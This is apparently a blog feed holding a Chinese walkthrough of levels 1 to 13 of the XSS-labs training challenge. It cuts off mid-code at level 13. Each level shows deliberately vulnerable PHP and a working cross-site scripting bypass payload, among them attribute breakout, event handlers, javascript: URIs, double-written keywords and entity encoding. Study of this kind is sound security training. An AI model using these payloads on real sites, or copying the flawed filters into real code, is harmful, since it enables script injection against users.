<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://kite-007.github.io</id>
    <title>Fr</title>
    <updated>2021-03-23T13:41:59.368Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://kite-007.github.io"/>
    <link rel="self" href="https://kite-007.github.io/atom.xml"/>
    <subtitle>意志坚定，持之以恒</subtitle>
    <logo>https://kite-007.github.io/images/avatar.png</logo>
    <icon>https://kite-007.github.io/favicon.ico</icon>
    <rights>All rights reserved 2021, Fr</rights>
    <entry>
        <title type="html"><![CDATA[# XSS-labs]]></title>
        <id>https://kite-007.github.io/xss-ba-chang/</id>
        <link href="https://kite-007.github.io/xss-ba-chang/">
        </link>
        <updated>2021-03-22T08:05:28.000Z</updated>
        <content type="html"><![CDATA[<p><ul class="markdownIt-TOC">
<li><a href="#1-xss-level1">1. xss-level1</a></li>
<li><a href="#2-xss-level2">2. xss-level2</a></li>
<li><a href="#3-xss-level3">3. xss-level3</a></li>
<li><a href="#4-xss-level4">4. xss-level4</a></li>
<li><a href="#5-xss-level5">5. xss-level5</a></li>
<li><a href="#6-xss-level6">6. xss-level6</a></li>
<li><a href="#7-xss-level7">7. xss-level7</a></li>
<li><a href="#8-xss-level8">8. xss-level8</a></li>
<li><a href="#9-xss-level9">9. xss-level9</a></li>
<li><a href="#10-xss-level10">10. xss-level10</a></li>
<li><a href="#11-xss-level11">11. xss-level11</a></li>
<li><a href="#12-xss-level12">12. xss-level12</a></li>
<li><a href="#13-xss-level13">13. xss-level13</a></li>
<li><a href="#14-xss-level14">14. xss-level14</a></li>
<li><a href="#15-xss-level15">15. xss-level15</a></li>
<li><a href="#16-xss-level16">16. xss-level16</a></li>
<li><a href="#17-xss-level17">17. xss-level17</a></li>
<li><a href="#18-xss-level18">18. xss-level18</a></li>
<li><a href="#19-xss-level19">19. xss-level19</a></li>
<li><a href="#20-xss-level20">20. xss-level20</a></li>
</ul>
(XSS)</p>
<h1 id="1-xss-level1">1. xss-level1</h1>
<ol>
<li>查看文件源码；</li>
</ol>
<pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
&lt;script&gt;
window.alert = function()  
{     
confirm(&quot;完成的不错！&quot;);
 window.location.href=&quot;level2.php?keyword=test&quot;; 
}
&lt;/script&gt;
&lt;title&gt;欢迎来到level1&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1 align=center&gt;欢迎来到level1&lt;/h1&gt;
&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
$str = $_GET[&quot;name&quot;];
echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;
?&gt;
&lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt;
&lt;?php 
echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;
?&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<ul>
<li>首先，在head标签的script中重写了alert方法，它会在弹出提示的同时跳转到下一关。</li>
<li>之后查看到它是以GET方式提交用户名，并没有对这个字符串进行过滤，所以存在xss注入。</li>
</ul>
<ol>
<li>在HackBar中，显示URL:XSS/level1.php?name=test里更改test，直接执行alert方法，完成。</li>
</ol>
<pre><code>level1.php?name=&lt;script&gt;alert()&lt;/script&gt;
</code></pre>
<h1 id="2-xss-level2">2. xss-level2</h1>
<pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
&lt;script&gt;
window.alert = function()  
{     
confirm(&quot;完成的不错！&quot;);
 window.location.href=&quot;level3.php?writing=wait&quot;; 
}
&lt;/script&gt;
&lt;title&gt;欢迎来到level2&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1 align=center&gt;欢迎来到level2&lt;/h1&gt;
&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
$str = $_GET[&quot;keyword&quot;];
echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
&lt;form action=level2.php method=GET&gt;
&lt;input name=keyword  value=&quot;'.$str.'&quot;&gt;
&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;
&lt;/form&gt;
&lt;/center&gt;';
?&gt;
&lt;center&gt;&lt;img src=level2.png&gt;&lt;/center&gt;
&lt;?php 
echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;
?&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<ul>
<li>一样执行跳转，但是这里有.htmlspecialchars($str).对字符串进行了预定义字符转化为实体
<ul>
<li>htmlspecialchars() 函数把一些预定义的字符转换为 HTML 实体，默认不会处理单引号。</li>
<li>预定义的字符是：</li>
</ul>
</li>
</ul>
<pre><code>&amp; （和号）成为 &amp;amp;
&quot; （双引号）成为 &amp;quot;
' （单引号）成为 '
&lt; （小于）成为 &amp;lt;
&gt; （大于）成为 &amp;gt;
</code></pre>
<ul>
<li>如需把特殊的 HTML 实体转换回字符，请使用 htmlspecialchars_decode() 函数。<br>
我们看到在input标签中有我们提交的value的值，并没有进行过滤就进行输出，所以把input标签闭合，从而执行alert。</li>
</ul>
<pre><code>level2.php?keyword=&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;
</code></pre>
<h1 id="3-xss-level3">3. xss-level3</h1>
<pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
&lt;script&gt;
window.alert = function()  
{     
confirm(&quot;完成的不错！&quot;);
 window.location.href=&quot;level4.php?keyword=try harder!&quot;; 
}
&lt;/script&gt;
&lt;title&gt;欢迎来到level3&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1 align=center&gt;欢迎来到level3&lt;/h1&gt;
&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
$str = $_GET[&quot;keyword&quot;];
echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;
&lt;form action=level3.php method=GET&gt;
&lt;input name=keyword  value='&quot;.htmlspecialchars($str).&quot;'&gt;
&lt;input type=submit name=submit value=搜索 /&gt;
&lt;/form&gt;
&lt;/center&gt;&quot;;
?&gt;
&lt;center&gt;&lt;img src=level3.png&gt;&lt;/center&gt;
&lt;?php 
echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;
?&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<ul>
<li>我们看到这里他对value进行了预定义字符转实体的过滤，实际上单引号还是可以闭合（因为默认没有对单引号进行处理），所以用单引号对input里的value进行包裹使其为空字符串，并利用“事件”：onclick或ondblclick等的其他 <a href="https://www.w3school.com.cn/tags/html_ref_eventattributes.asp">HTML事件</a>。</li>
</ul>
<pre><code>&lt;input name=keyword  value='' onclick='alert()'&gt;
level3.php?keyword=' onclick='alert()
</code></pre>
<h1 id="4-xss-level4">4. xss-level4</h1>
<ol>
<li>ctrl+u查看源码：</li>
</ol>
<pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
&lt;script&gt;
window.alert = function()  
{     
confirm(&quot;完成的不错！&quot;);
 window.location.href=&quot;level5.php?keyword=find a way out!&quot;; 
}
&lt;/script&gt;
&lt;title&gt;欢迎来到level4&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1 align=center&gt;欢迎来到level4&lt;/h1&gt;
&lt;h2 align=center&gt;没有找到和&amp;quot; ondblclick=&amp;quot;alert()相关的结果.&lt;/h2&gt;&lt;center&gt;
&lt;form action=level4.php method=GET&gt;
&lt;input name=keyword  value=&quot;&quot; ondblclick=&quot;alert()&quot;&gt;
&lt;input type=submit name=submit value=搜索 /&gt;
&lt;/form&gt;
&lt;/center&gt;&lt;center&gt;&lt;img src=level4.png&gt;&lt;/center&gt;
&lt;h3 align=center&gt;payload的长度:21&lt;/h3&gt;&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<ul>
<li>根据前面的经验，这里的预定义字符又被过滤了，上一关的是使用单引号进行闭合，这里本应该使用双引号进行包裹，但是会发现这里双引号是会被转义的，那么怎么办？</li>
<li>但是仔细看就会发现，这里h2标签中的双引号被转义了，input标签中并没有，所以用双引号包裹，完成。</li>
</ul>
<ol start="2">
<li>php代码:</li>
</ol>
<pre><code>&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
$str = $_GET[&quot;keyword&quot;];
$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);
$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);
echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
&lt;form action=level4.php method=GET&gt;
&lt;input name=keyword  value=&quot;'.$str3.'&quot;&gt;
&lt;input type=submit name=submit value=搜索 /&gt;
&lt;/form&gt;
&lt;/center&gt;';
?&gt;
</code></pre>
<ul>
<li>可以看出input标签中str3只是替换掉了尖括号，h2中则进行了预定义字符转义。</li>
</ul>
<h1 id="5-xss-level5">5. xss-level5</h1>
<ol>
<li>ctrl+u</li>
</ol>
<pre><code>&lt;body&gt;
&lt;h1 align=center&gt;欢迎来到level5&lt;/h1&gt;
&lt;h2 align=center&gt;没有找到和&amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt;
&lt;form action=level5.php method=GET&gt;
&lt;input name=keyword  value=&quot;&lt;scr_ipt&gt;alert()&lt;/script&gt;&quot;&gt;
&lt;input type=submit name=submit value=搜索 /&gt;
&lt;/form&gt;
</code></pre>
<ul>
<li>在h2标签中会进行预定义字符转义，value中一些特殊字符中会加上下划线</li>
<li>过滤掉了script和事件。</li>
</ul>
<ol start="2">
<li>payload,点击something超链接执行js</li>
</ol>
<pre><code>&lt;input name=keyword  value=&quot;&quot; /&gt; &lt;a href=javascript:alert()&gt;something&lt;/a&gt;&quot;&gt;
level5.php?keyword=&quot; /&gt; &lt;a href=javascript:alert()&gt;something&lt;/a&gt;
</code></pre>
<p>javascript:是表示在触发默认动作时，执行一段JavaScript代码，而 javascript:; 表示什么都不执行，这样点击时就没有任何反应。<br>
href：URL    规定链接的目标 URL。</p>
<pre><code>&lt;a href=&quot;www.baidu.com&quot;&gt;XXX&lt;/a&gt;   这个a标签的话就是指点击XXX后跳转到百度首页
&lt;a href=&quot;javascript:;&quot;&gt;XXX&lt;/a&gt;  点击XXX后是不会跳转的，一般用于开发时页面还未完成
</code></pre>
<ol start="3">
<li>php代码</li>
</ol>
<pre><code>&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
$str = strtolower($_GET[&quot;keyword&quot;]);
$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);
$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);
echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
&lt;form action=level5.php method=GET&gt;
&lt;input name=keyword  value=&quot;'.$str3.'&quot;&gt;
&lt;input type=submit name=submit value=搜索 /&gt;
&lt;/form&gt;
&lt;/center&gt;';
?&gt;
</code></pre>
<ul>
<li>strtolower就是将字母转换为小写并返回值</li>
</ul>
<ol start="4">
<li><a href="https://www.html.cn/qa/javascript/11155.html">javascript伪协议</a>：
<ul>
<li>伪协议是为关联应用程序而使用的，JavaScript伪协议实际上是把javascript:后面的代码当JavaScript来执行，并将结果值返回给当前页面。</li>
<li>这个特殊的协议类型声明了URL的主体是任意的javascript代码，它由javascript的解释器运行。如果javascript:URL中的javascript代码含有多个语句，必须使用分号将这些语句分隔开。</li>
<li>当浏览器装载了这样的URL时，它将执行这个URL中包含的javascript代码，并把最后一条javascript语句的字符串值作为新文档的内容显示出来。这个字符串值可以含有HTML标记，并被格式化，其显示与其他装载进浏览器的文档完全相同。</li>
<li>javascript URL还可以含有只执行动作，但不返回值的javascript语句。装载了这种URL时，浏览器仅执行其中的javascript代码，但由于没有作为新文档来显示的值，因此它并不改变当前显示的文档。</li>
</ul>
</li>
</ol>
<h1 id="6-xss-level6">6. xss-level6</h1>
<ol>
<li>ctrl+u</li>
</ol>
<pre><code>&lt;body&gt;
&lt;h1 align=center&gt;欢迎来到level6&lt;/h1&gt;
&lt;h2 align=center&gt;没有找到和 &amp;quot; /&amp;gt; &amp;lt;a href=javascript:alert()&amp;gt;something&amp;lt;/a&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt;
&lt;form action=level6.php method=GET&gt;
&lt;input name=keyword  value=&quot; &quot; /&gt; &lt;a hr_ef=javascript:alert()&gt;something&lt;/a&gt;&quot;&gt;
&lt;input type=submit name=submit value=搜索 /&gt;
&lt;/form&gt;
</code></pre>
<ul>
<li>在前面的基础上过滤了href</li>
</ul>
<ol start="2">
<li>php</li>
</ol>
<pre><code>&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
$str = $_GET[&quot;keyword&quot;];
$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);
$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);
$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);
$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);
$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);
echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
&lt;form action=level6.php method=GET&gt;
&lt;input name=keyword  value=&quot;'.$str6.'&quot;&gt;
&lt;input type=submit name=submit value=搜索 /&gt;
&lt;/form&gt;
&lt;/center&gt;';
?&gt;
</code></pre>
<ul>
<li>发现了与上一关不同的是这里并没有对大小写进行过滤</li>
</ul>
<pre><code>&lt;input name=keyword  value=&quot;&quot; /&gt; &lt;a HREF=javascript:alert()&gt;something&lt;/a&gt;&quot;&gt;
level6.php?keyword=&quot; /&gt; &lt;a HREF=javascript:alert()&gt;something&lt;/a&gt;
</code></pre>
<h1 id="7-xss-level7">7. xss-level7</h1>
<ol>
<li>ctrl+u</li>
</ol>
<pre><code>&lt;body&gt;
&lt;h1 align=center&gt;欢迎来到level7&lt;/h1&gt;
&lt;h2 align=center&gt;没有找到和&amp;quot; /&amp;gt; &amp;lt;a href=javascript:alert()&amp;gt;something&amp;lt;/a&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt;
&lt;form action=level7.php method=GET&gt;
&lt;input name=keyword  value=&quot;&quot; /&gt; &lt;a =java:alert()&gt;something&lt;/a&gt;&quot;&gt;
&lt;input type=submit name=submit value=搜索 /&gt;
&lt;/form&gt;
</code></pre>
<ul>
<li>过滤了大小写，特殊字符直接删除掉了</li>
</ul>
<ol start="2">
<li>php</li>
</ol>
<pre><code>&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
$str =strtolower( $_GET[&quot;keyword&quot;]);
$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);
$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);
$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);
$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);
$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);
echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
&lt;form action=level7.php method=GET&gt;
&lt;input name=keyword  value=&quot;'.$str6.'&quot;&gt;
&lt;input type=submit name=submit value=搜索 /&gt;
&lt;/form&gt;
&lt;/center&gt;';
?&gt;
</code></pre>
<ul>
<li>发现对数据进行了一次删除的过滤，所以可以进行双写包裹绕过。</li>
</ul>
<pre><code>&lt;input name=keyword  value=&quot;&quot; /&gt; &lt;script&gt;alert()&lt;/script&gt;&quot;&gt;
&quot;/&gt; &lt;scripscriptt&gt;alert()&lt;/scriscriptpt&gt;
</code></pre>
<h1 id="8-xss-level8">8. xss-level8</h1>
<ol>
<li>ctrl+u</li>
</ol>
<pre><code>&lt;body&gt;
&lt;h1 align=center&gt;欢迎来到level8&lt;/h1&gt;
&lt;center&gt;
&lt;form action=level8.php method=GET&gt;
&lt;input name=keyword  value=&quot;on&quot;&gt;
&lt;input type=submit name=submit value=添加友情链接 /&gt;
&lt;/form&gt;
&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;o_n&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;
&lt;h3 align=center&gt;payload的长度:3&lt;/h3&gt;&lt;/body&gt;
</code></pre>
<ul>
<li>过滤大小写，特殊字符增加下划线，上面对预字符进行过滤，下面没有过滤尖括号。</li>
</ul>
<ol start="2">
<li>php</li>
</ol>
<pre><code>&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
$str = strtolower($_GET[&quot;keyword&quot;]);
$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);
$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);
$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);
$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);
$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);
$str7=str_replace('&quot;','&amp;quot',$str6);
echo '&lt;center&gt;
&lt;form action=level8.php method=GET&gt;
&lt;input name=keyword  value=&quot;'.htmlspecialchars($str).'&quot;&gt;
&lt;input type=submit name=submit value=添加友情链接 /&gt;
&lt;/form&gt;
&lt;/center&gt;';
?&gt;
&lt;?php
 echo '&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;'.$str7.'&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;';
?&gt;
&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;
&lt;?php 
echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&lt;/h3&gt;&quot;;
?&gt;
</code></pre>
<ol start="3">
<li>实体化编码，在搜索框中输入</li>
</ol>
<pre><code>&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;javascrip&amp;#116;:alert()&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;
javascrip&amp;#116;:alert()
</code></pre>
<ul>
<li>因为这里的过滤都是在后端进行，而在后端被实体化编码的部分可以绕过过滤，返回前端时又可以被浏览器解析为原来的样子。</li>
</ul>
<h1 id="9-xss-level9">9. xss-level9</h1>
<ol>
<li>ctrl+u,提示要有一个合法链接</li>
</ol>
<pre><code>&lt;body&gt;
&lt;h1 align=center&gt;欢迎来到level9&lt;/h1&gt;
&lt;center&gt;
&lt;form action=level9.php method=GET&gt;
&lt;input name=keyword  value=&quot;javascrip&amp;amp;#116;:alert()&quot;&gt;
&lt;input type=submit name=submit value=添加友情链接 /&gt;
&lt;/form&gt;
&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;
&lt;h3 align=center&gt;payload的长度:23&lt;/h3&gt;&lt;/body&gt;
</code></pre>
<ol start="2">
<li>php</li>
</ol>
<pre><code>&lt;?php
if(false===strpos($str7,'http://'))
{
  echo '&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;';
        }
else
{
  echo '&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;'.$str7.'&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;';
}
?&gt;
</code></pre>
<ul>
<li>这里与level8的区别，加了一个if判断语句，查询链接中是否有http://，如果没有则连接不合法。</li>
<li>strpos：查询（http://）第一次出现的位置，布尔类型。</li>
</ul>
<ol start="3">
<li>在http://前加了//表示对后面的进行了注释，从而不影响前面的代码。</li>
</ol>
<ul>
<li>这里可以想出http://可以在字符串的任意位置，只要不影响恶意的代码，所以可以写再alert里面尝试。</li>
</ul>
<pre><code>&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;javascrip&amp;#116;:alert()//http://&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;
javascrip&amp;#116;:alert()//http://
javascrip&amp;#116;:alert('http://')
</code></pre>
<h1 id="10-xss-level10">10. xss-level10</h1>
<ol>
<li>ctrl+u</li>
</ol>
<pre><code>&lt;body&gt;
&lt;h1 align=center&gt;欢迎来到level10&lt;/h1&gt;
&lt;h2 align=center&gt;没有找到和相关的结果.&lt;/h2&gt;&lt;center&gt;
&lt;form id=search&gt;
&lt;input name=&quot;t_link&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_history&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_sort&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
&lt;/form&gt;
&lt;/center&gt;&lt;center&gt;&lt;img src=level10.png&gt;&lt;/center&gt;
&lt;h3 align=center&gt;payload的长度:0&lt;/h3&gt;&lt;/body&gt;
</code></pre>
<ul>
<li>第一个参数keyword的预定义字符被过滤掉了，查看代码后发现还有三个隐藏掉的input，先试一试用GET方式提交参数，发现只有t_sort有显示信息，并且被过滤掉了尖括号。</li>
<li>从t_sort入手，带有尖括号的标签不能用了，所以尝试使用事件，通过闭合value构造payload。</li>
</ul>
<ol start="2">
<li>php</li>
</ol>
<pre><code>&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
$str = $_GET[&quot;keyword&quot;];
$str11 = $_GET[&quot;t_sort&quot;];
$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);
$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);
echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
&lt;form id=search&gt;
&lt;input name=&quot;t_link&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_history&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_sort&quot;  value=&quot;'.$str33.'&quot; type=&quot;hidden&quot;&gt;
&lt;/form&gt;
&lt;/center&gt;';
?&gt;
</code></pre>
<ol start="3">
<li>payload</li>
</ol>
<pre><code>level10.php?t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert()
</code></pre>
<h1 id="11-xss-level11">11. xss-level11</h1>
<ol>
<li>ctrl+u</li>
</ol>
<pre><code>&lt;body&gt;
&lt;h1 align=center&gt;欢迎来到level11&lt;/h1&gt;
&lt;h2 align=center&gt;没有找到和相关的结果.&lt;/h2&gt;&lt;center&gt;
&lt;form id=search&gt;
&lt;input name=&quot;t_link&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_history&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_sort&quot;  value=&quot;&amp;lt;'&amp;quot;c&amp;quot;'&amp;gt;&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_ref&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
&lt;/form&gt;
&lt;/center&gt;&lt;center&gt;&lt;img src=level11.png&gt;&lt;/center&gt;
&lt;h3 align=center&gt;payload的长度:0&lt;/h3&gt;&lt;/body&gt;
</code></pre>
<ul>
<li>t_sort信息有回显，但是预定义字符被过滤掉了。</li>
</ul>
<ol start="2">
<li>php</li>
</ol>
<pre><code>&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
$str = $_GET[&quot;keyword&quot;];
$str00 = $_GET[&quot;t_sort&quot;];
$str11=$_SERVER['HTTP_REFERER'];
$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);
$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);
echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
&lt;form id=search&gt;
&lt;input name=&quot;t_link&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_history&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_sort&quot;  value=&quot;'.htmlspecialchars($str00).'&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_ref&quot;  value=&quot;'.$str33.'&quot; type=&quot;hidden&quot;&gt;
&lt;/form&gt;
&lt;/center&gt;';
?&gt;
</code></pre>
<ul>
<li>发现这里t_ref是有xss漏洞的，但是提交的方式并不是GET而是SERVER，可以通过HackBar进行Referer提交payload</li>
</ul>
<ol start="3">
<li></li>
</ol>
<pre><code>http://192.168.200.1/WWW/XSS/level11.php?t_link=a&amp;t_history=b&amp;t_sort=&lt;&quot;c&quot;&gt;&amp;t_ref=d
Referer：&quot; type=&quot;text&quot; onclick=&quot;alert()
</code></pre>
<h1 id="12-xss-level12">12. xss-level12</h1>
<ol>
<li>ctrl+u</li>
</ol>
<pre><code>&lt;body&gt;
&lt;h1 align=center&gt;欢迎来到level12&lt;/h1&gt;
&lt;h2 align=center&gt;没有找到和相关的结果.&lt;/h2&gt;&lt;center&gt;
&lt;form id=search&gt;
&lt;input name=&quot;t_link&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_history&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_sort&quot;  value=&quot;&amp;lt;&amp;quot;c&amp;quot;&amp;gt;&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_ua&quot;  value=&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot; type=&quot;hidden&quot;&gt;
&lt;/form&gt;
&lt;/center&gt;&lt;center&gt;&lt;img src=level12.png&gt;&lt;/center&gt;
&lt;h3 align=center&gt;payload的长度:0&lt;/h3&gt;&lt;/body&gt;
</code></pre>
<ul>
<li>有个参数t_ua的后面是我们的User Agent信息，所以直接试一试上一关的payload，通过HackBar的User Agent提交。</li>
</ul>
<ol start="2">
<li>php</li>
</ol>
<pre><code>&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
$str = $_GET[&quot;keyword&quot;];
$str00 = $_GET[&quot;t_sort&quot;];
$str11=$_SERVER['HTTP_USER_AGENT'];
$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);
$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);
echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
&lt;form id=search&gt;
&lt;input name=&quot;t_link&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_history&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_sort&quot;  value=&quot;'.htmlspecialchars($str00).'&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_ua&quot;  value=&quot;'.$str33.'&quot; type=&quot;hidden&quot;&gt;
&lt;/form&gt;
&lt;/center&gt;';
?&gt;
</code></pre>
<h1 id="13-xss-level13">13. xss-level13</h1>
<ol>
<li>ctrl+u</li>
</ol>
<pre><code>&lt;body&gt;
&lt;h1 align=center&gt;欢迎来到level13&lt;/h1&gt;
&lt;h2 align=center&gt;没有找到和good job!相关的结果.&lt;/h2&gt;&lt;center&gt;
&lt;form id=search&gt;
&lt;input name=&quot;t_link&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_history&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_sort&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_cook&quot;  value=&quot;call me maybe?&quot; type=&quot;hidden&quot;&gt;
&lt;/form&gt;
&lt;/center&gt;&lt;center&gt;&lt;img src=level13.png&gt;&lt;/center&gt;
&lt;h3 align=center&gt;payload的长度:9&lt;/h3&gt;&lt;/body&gt;
</code></pre>
<ul>
<li>有个cook参数，猜测使用Cookies可以提交，使用上上关payload，发现cook内容里的参数消失了。</li>
</ul>
<ol start="2">
<li>php</li>
</ol>
<pre><code>&lt;?php 
setcookie(&quot;user&quot;, &quot;call me maybe?&quot;, time()+3600);
ini_set(&quot;display_errors&quot;, 0);
$str = $_GET[&quot;keyword&quot;];
$str00 = $_GET[&quot;t_sort&quot;];
$str11=$_COOKIE[&quot;user&quot;];
$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);
